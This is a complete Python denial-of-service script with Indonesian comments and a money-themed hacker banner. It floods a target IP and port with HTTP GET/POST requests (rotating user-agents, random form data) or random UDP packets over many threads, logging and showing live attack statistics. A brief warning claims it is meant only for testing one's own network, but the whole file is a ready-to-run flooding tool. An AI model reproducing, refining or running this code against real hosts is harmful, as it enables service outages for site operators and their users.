import socket
import threading
import random
import sys
import time
import logging
from colorama import init, Fore

# --- Inisialisasi Colorama ---
init()

# --- Konfigurasi Logging ---
LOG_FILENAME = 'attack_log.txt'
logging.basicConfig(filename=LOG_FILENAME, level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# --- Banner ---
BANNER = Fore.CYAN + r"""
KUMPULAN PARA MENTOR MODUS DUIT
____   ___   ___              _     
|___ \ / _ \ / _ \   _ __ ___ | |__  
  __) | | | | | | | | '_ ` _ \| '_ \ 
 / __/| |_| | |_| | | | | | | | |_) |
|_____|\___/ \___/  |_| |_| |_|_.__/ 
  ADAKAH SERATUS BUAT BELI DATA ??                                   
"""
print(BANNER)

# --- Statistik Global & Lock ---
sent_requests = 0
error_count = 0
received_responses = 0 # Statistik baru
server_errors = 0      # Statistik baru
lock = threading.Lock()

# --- Daftar User-Agent (Mobile-centric) ---
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def generate_random_string(length=100):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(characters) for _ in range(length))

def generate_http_request(target, method='GET'):
    random_path = f"/?id={random.randint(10000, 99999)}"
    headers = [
        f"{method.upper()} {random_path} HTTP/1.1",
        f"Host: {target}",
        f"User-Agent: {get_random_user_agent()}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.5",
        "Accept-Encoding: gzip, deflate",
        "Connection: keep-alive",
        "Upgrade-Insecure-Requests: 1",
        "Cache-Control: no-cache",
    ]
    
    body_data = b""
    if method.upper() == 'POST':
        post_payload_str = f"user={generate_random_string(20)}&pass={generate_random_string(20)}&data={generate_random_string(50)}"
        body_data = post_payload_str.encode('utf-8', errors='ignore')
        headers.append(f"Content-Type: application/x-www-form-urlencoded")
        headers.append(f"Content-Length: {len(body_data)}")
    
    headers.append("")
    request = "\r\n".join(headers)
    if body_data:
        request += "\r\n" + body_data.decode('utf-8', errors='ignore')
    return request

def generate_udp_packet(target_ip, target_port):
    payload = b"".join(random.choice(b"abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(random.randint(500, 1000)))
    return payload

# --- Fungsi Attack HTTP yang Dimodifikasi ---
def http_attack(target, port, method='GET', read_response=True, response_bytes=1024):
    global sent_requests, error_count, received_responses, server_errors
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3) # Timeout untuk koneksi
            s.connect((target, port))
            
            request_data = generate_http_request(target, method=method)
            s.sendall(request_data.encode('utf-8', errors='ignore'))
            
            with lock:
                sent_requests += 1
            
            # --- Mulai bagian untuk membaca respons ---
            if read_response:
                s.settimeout(1) # Timeout yang lebih pendek untuk membaca respons
                response = s.recv(response_bytes) # Baca sejumlah byte
                
                if response:
                    with lock:
                        received_responses += 1
                    # Analisis sederhana respons
                    try:
                        # Cari kode status HTTP (misal: "HTTP/1.1 200 OK")
                        response_str = response.decode('utf-8', errors='ignore')
                        if "HTTP/" in response_str:
                            status_line = response_str.split('\r\n')[0]
                            if "200" in status_line: # Sukses
                                # logging.info(f"HTTP {method} to {target}:{port} - SUCCESS (Status 2xx). Response snippet: {response_str[:100]}...")
                                pass # Respons sukses, tidak perlu log detail setiap kali
                            elif any(code in status_line for code in ["400", "401", "403", "404", "500", "502", "503", "504"]): # Error
                                with lock:
                                    server_errors += 1
                                logging.warning(f"HTTP {method} to {target}:{port} - SERVER ERROR (Status {status_line.split(' ')[1]}). Response snippet: {response_str[:100]}...")
                            else:
                                # logging.info(f"HTTP {method} to {target}:{port} - Received status: {status_line}. Response snippet: {response_str[:100]}...")
                                pass
                        # else:
                            # logging.info(f"HTTP {method} to {target}:{port} - Received non-HTTP response snippet: {response_str[:100]}...")
                    except Exception as log_err:
                        logging.warning(f"Error parsing HTTP response from {target}:{port}: {log_err}")
                else:
                    # Tidak ada respons diterima setelah timeout membaca
                    # logging.info(f"HTTP {method} to {target}:{port} - No response received after sending.")
                    pass
            # --- Akhir bagian membaca respons ---
            
        except socket.gaierror:
            with lock:
                error_count += 1
            break
        except socket.timeout: # Timeout saat koneksi atau saat recv
            with lock:
                error_count += 1
        except ConnectionRefusedError:
            with lock:
                error_count += 1
            break
        except OSError as e:
            with lock:
                error_count += 1
        except Exception as e:
            with lock:
                error_count += 1
                logging.error(f"Exception in HTTP attack ({method}): {e}")
        finally:
            if s:
                s.close()
        
        time.sleep(random.uniform(0.005, 0.02)) 

# --- Fungsi Attack UDP (tetap sama karena UDP sulit dipantau responsnya) ---
def udp_attack(target_ip, target_port):
    global sent_requests, error_count
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)

            udp_payload = generate_udp_packet(target_ip, target_port)
            s.sendto(udp_payload, (target_ip, target_port))
            
            with lock:
                sent_requests += 1
            
        except socket.gaierror:
            with lock:
                error_count += 1
            break
        except socket.timeout:
            with lock:
                error_count += 1
        except OSError as e:
            with lock:
                error_count += 1
        except Exception as e:
            with lock:
                error_count += 1
        finally:
            if s:
                s.close()
        
        time.sleep(random.uniform(0.001, 0.005))

# --- Fungsi untuk menampilkan statistik secara berkala ---
def stats_display(stop_event):
    while not stop_event.is_set():
        with lock:
            current_sent = sent_requests
            current_errors = error_count
            current_received = received_responses
            current_server_errors = server_errors
        
        progress_bar = (
            f"[{Fore.CYAN}STATS{Fore.RESET}] Sent: {Fore.GREEN}{current_sent}{Fore.RESET} | "
            f"Received: {Fore.CYAN}{current_received}{Fore.RESET} | "
            f"Srv Err: {Fore.YELLOW}{current_server_errors}{Fore.RESET} | "
            f"Errors: {Fore.RED}{current_errors}{Fore.RESET} | "
            f"Log: {LOG_FILENAME}"
        )
        sys.stdout.write('\r' + progress_bar + ' ' * 10)
        sys.stdout.flush()
        
        time.sleep(1)
    sys.stdout.write('\n')
    sys.stdout.flush()

if __name__ == "__main__":
    print(f"{Fore.YELLOW}!!! PERINGATAN !!!{Fore.RESET}")
    print(f"{Fore.YELLOW}Script ini dirancang untuk menguji ketahanan server di JARINGAN ANDA SENDIRI.{Fore.RESET}")
    print(f"{Fore.YELLOW}Penggunaan terhadap sistem tanpa izin adalah ILEGAL dan TIDAK ETIS.{Fore.RESET}")
    print(f"{Fore.YELLOW}IP Anda AKAN terlihat oleh target.{Fore.RESET}")
    print(f"{Fore.RED}Tekan CTRL+C dalam 5 detik untuk membatalkan...{Fore.RESET}")
    
    try:
        time.sleep(5)
        
        if len(sys.argv) < 5:
            print(f"\nUsage: python3 {sys.argv[0]} <TARGET_IP> <PORT> <THREADS> <ATTACK_TYPE> [HTTP_METHOD]")
            print("ATTACK_TYPE: 'http' or 'udp'")
            print("HTTP_METHOD (optional, for 'http' type): 'GET' (default) or 'POST'")
            print("\nExample:")
            print(f"  HTTP GET (default): python3 {sys.argv[0]} 192.168.1.100 80 1000 http")
            print(f"  HTTP POST:          python3 {sys.argv[0]} 192.168.1.100 8080 1000 http POST")
            print(f"  UDP Attack:         python3 {sys.argv[0]} 192.168.1.100 53 5000 udp")
            sys.exit(1)
            
        target_ip = sys.argv[1]
        attack_type = sys.argv[4].lower()
        http_method = 'GET'

        if attack_type == 'http' and len(sys.argv) > 5:
            http_method = sys.argv[5].upper()
            if http_method not in ['GET', 'POST']:
                print(f"Error: Invalid HTTP method '{http_method}'. Use 'GET' or 'POST'.")
                sys.exit(1)

        try:
            target_port = int(sys.argv[2])
            threads = int(sys.argv[3])
            
            if target_port <= 0 or target_port > 65535:
                raise ValueError("PORT must be between 1 and 65535.")
            if threads <= 0:
                raise ValueError("THREADS must be a positive integer.")
            if attack_type not in ['http', 'udp']:
                raise ValueError("ATTACK_TYPE must be 'http' or 'udp'.")

        except ValueError as e:
            print(f"Error: {e}")
            sys.exit(1)

        print(f"\n{Fore.GREEN}Starting {attack_type.upper()} attack on {target_ip}:{target_port} with {threads} threads (Method: {http_method})...{Fore.RESET}")
        logging.info(f"Starting {attack_type.upper()} attack on {target_ip}:{target_port} with {threads} threads (Method: {http_method}).")

        stop_event = threading.Event()
        stats_thread = threading.Thread(target=stats_display, args=(stop_event,))
        stats_thread.daemon = True
        stats_thread.start()

        attack_threads = []
        if attack_type == 'http':
            for _ in range(threads):
                # Tambahkan argumen read_response=True (default) dan response_bytes=1024
                thread = threading.Thread(target=http_attack, args=(target_ip, target_port, http_method, True, 1024))
                thread.daemon = True
                attack_threads.append(thread)
                thread.start()
        elif attack_type == 'udp':
            for _ in range(threads):
                thread = threading.Thread(target=udp_attack, args=(target_ip, target_port))
                thread.daemon = True
                attack_threads.append(thread)
                thread.start()
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nAttack stopped by user. Exiting...")
        stop_event.set()
        stats_thread.join(timeout=1)
        logging.info("Attack stopped by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn unexpected error occurred in the main thread: {e}")
        stop_event.set()
        logging.critical(f"Main thread error: {e}")
        sys.exit(1)

